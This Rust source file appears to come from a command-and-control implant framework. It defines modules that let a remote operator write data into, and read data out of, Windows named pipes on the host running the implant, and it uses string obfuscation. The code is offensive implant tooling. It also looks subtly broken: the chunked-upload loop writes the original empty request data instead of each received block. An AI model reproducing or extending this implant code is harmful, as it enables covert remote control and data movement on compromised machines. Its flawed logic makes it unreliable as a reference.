use std::io::{Read, Write};
use crate::{check_field, check_request, Module, Result, TaskError, TaskResult};
use malefic_proto::proto::implantpb::spite::Body;
use async_trait::async_trait;
use obfstr::obfstr;
use malefic_helper::{debug, to_error};
use malefic_helper::win::pipe::{PipeClient};
use malefic_proto::proto::implantpb;
use malefic_proto::proto::modulepb::Response;
use malefic_trait::module_impl;
pub struct PipeUpload {}

#[async_trait]
#[module_impl("pipe_upload")]
impl Module for PipeUpload {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name = check_field!(request.name)?;

        let mut pipe_client = match PipeClient::connect(&*pipe_name) {
            Ok(client) => client,
            Err(e) => {
                debug!("Failed to connect to pipe");
                return Err(e.into());
            },
        };

        if request.data.is_empty() {
            // if data is empty, do nothing
        } else {
            to_error!(pipe_client.write_all(&request.data));
            drop(pipe_client);
            return Ok(TaskResult::new_with_ack(id, 0));
        }

        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;

        loop {
            let block = check_request!(receiver, Body::Block)?;
            let _ = to_error!(pipe_client.write_all(&request.data));

            if block.end {
                drop(pipe_client);
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}


pub struct PipeRead {}

#[async_trait]
#[module_impl("pipe_read")]
impl Module for PipeRead {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut crate::Input,
        _sender: &mut crate::Output,
    ) -> Result {
        let request = check_request!(receiver, Body::PipeRequest)?;
        let pipe_name: String = check_field!(request.name)?;

        let mut pipe_client = match PipeClient::connect(&*pipe_name) {
            Ok(client) => client,
            Err(e) => {
                debug!("Failed to connect to pipe");
                return Err(e.into());
            },
        };

        let mut buffer = vec![0; 4096];
        let mut total_content = Vec::new();

        loop {
            let bytes_read = to_error!(pipe_client.read(&mut buffer))? as usize;
            if bytes_read == 0 {
                drop(pipe_client);
                break;
            }

            total_content.extend_from_slice(&buffer[..bytes_read]);
        }

        let resp = Response {
            output: String::from_utf8_lossy(&total_content).to_string(),
            error: "".to_string(),
            kv: Default::default(),
            array: vec![],
        };

        Ok(TaskResult::new_with_body(id, Body::Response(resp)))
    }
}


// pub struct PipeClose {}

// #[async_trait]
// #[module_impl("pipe_close")]
// impl Module for PipeClose {
//     async fn run(
//         &mut self,
//         id: u32,
//         receiver: &mut crate::Input,
//         _sender: &mut crate::Output,  // 未使用的sender
//     ) -> Result {
//         let request = check_request!(receiver, Body::PipeRequest)?;
//         let pipe_name: String = check_field!(request.name)?;
//         let pipe = to_error!(NamedPipe::open(&pipe_name))?;
//
//         to_error!(pipe.disconnect())?;
//         pipe.close();
//
//         Ok(TaskResult::new_with_body(id, Body::Empty(implantpb::Empty::default())))
//     }
// }